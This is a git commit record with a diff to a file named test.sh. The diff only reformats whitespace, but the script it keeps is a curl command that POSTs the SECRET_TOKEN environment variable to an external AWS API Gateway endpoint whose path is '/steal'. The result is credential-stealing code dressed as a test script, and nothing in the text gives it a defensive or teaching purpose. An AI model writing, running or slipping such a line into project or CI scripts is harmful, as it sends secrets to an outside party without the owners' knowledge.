02617e99c7eb6f15b040b3c22d41bce2bc863ce3
kitahara51 <k.kitahara51@gmail.com>
2026-04-07 01:48:17 -0400

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-curl -s -X POST https://vz31vp7k4i.execute-api.us-east-1.amazonaws.com/steal \             
-    -H "Content-Type: application/x-www-form-urlencoded" \                                   
-    -d "secret=${SECRET_TOKEN}"                                                              
+curl -s -X POST https://vz31vp7k4i.execute-api.us-east-1.amazonaws.com/steal \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "secret=${SECRET_TOKEN}"
